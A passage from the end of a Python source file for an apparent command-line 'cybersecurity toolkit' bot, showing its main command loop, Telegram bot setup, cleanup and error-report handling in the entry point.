                print(f"\n{self.colors['green']}✅ Command executed ({result['execution_time']:.2f}s){self.colors['reset']}")
            else:
                print(f"\n{self.colors['red']}❌ Command failed: {result.get('output', 'Unknown error')}{self.colors['reset']}")
    
    def run(self):
        """Main application loop"""
        # Clear screen and show banner
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        # Check dependencies
        self.check_dependencies()
        
        # Setup Telegram
        if not self.telegram_bot.enabled:
            self.setup_telegram()
        else:
            self.start_telegram_bot()
        
        print(f"\n{self.colors['green']}✅ Tool ready! Type 'help' for commands.{self.colors['reset']}")
        print(f"{self.colors['cyan']}💡 Tip: All netcat commands available! Try: nc google.com 80{self.colors['reset']}")
        
        # Main command loop
        while self.running:
            try:
                command = self.print_prompt()
                self.process_command(command)
            
            except KeyboardInterrupt:
                print(f"\n{self.colors['yellow']}👋 Exiting...{self.colors['reset']}")
                self.running = False
            
            except Exception as e:
                print(f"{self.colors['red']}❌ Error: {str(e)}{self.colors['reset']}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.db.close()
        
        print(f"\n{self.colors['green']}✅ Tool shutdown complete.{self.colors['reset']}")
        print(f"{self.colors['cyan']}📁 Logs saved to: {LOG_FILE}{self.colors['reset']}")
        print(f"{self.colors['cyan']}💾 Database: {DATABASE_FILE}{self.colors['reset']}")

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    """Main entry point"""
    try:
        print(f"{Fore.CYAN}🚀 Starting Accurate Jerry Bot...{Style.RESET_ALL}")
        
        if os.name != 'nt' and os.geteuid() != 0:
            print(f"{Fore.YELLOW}⚠️  Warning: Some features may require administrative privileges.{Style.RESET_ALL}")
        
        toolkit = UltimateCybersecurityToolkit()
        toolkit.run()
    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}👋 Tool terminated by user.{Style.RESET_ALL}")
    
    except Exception as e:
        print(f"{Fore.RED}❌ Fatal error: {e}{Style.RESET_ALL}")
        logger.exception("Fatal error occurred")
        
        try:
            error_report = {
                'timestamp': datetime.datetime.now().isoformat(),
                'error': str(e),
                'traceback': logger.exception.__str__() if hasattr(logger.exception, '__str__') else str(e)
            }
            
            error_file = f"error_report_{int(time.time())}.json"
            with open(error_file, 'w') as f:
                json.dump(error_report, f, indent=2)
            
            print(f"{Fore.YELLOW}📄 Error report saved to: {error_file}{Style.RESET_ALL}")
        except:
            pass
        
        print(f"{Fore.RED}Please check {LOG_FILE} for details.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()